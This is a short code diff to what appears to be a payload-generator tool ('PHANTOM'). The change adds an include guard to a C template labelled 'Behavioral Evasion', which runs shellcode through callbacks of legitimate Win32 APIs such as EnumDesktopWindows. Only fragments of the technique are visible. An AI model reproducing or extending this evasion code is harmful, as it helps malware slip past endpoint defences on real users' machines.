@@ -32,6 +32,9 @@ def generate_callback_injection() -> Dict[str, Any]:
 // Layer 4 – Behavioral Evasion
 // Executes shellcode by passing it as a callback to legitimate Win32 APIs.
 
+#ifndef PHANTOM_CALLBACK_INJECTION_INCLUDED
+#define PHANTOM_CALLBACK_INJECTION_INCLUDED
+
 #include <windows.h>
 
 // ── Method 1: EnumDesktopWindows callback ────────────────────────────────────
@@ -77,6 +80,8 @@ static BOOL callback_execute(unsigned char *shellcode, size_t shellcode_len) {
     if (execute_via_enum_uilang(shellcode, shellcode_len))  return TRUE;
     return FALSE;
 }
+
+#endif /* PHANTOM_CALLBACK_INJECTION_INCLUDED */
 """
 
     return {
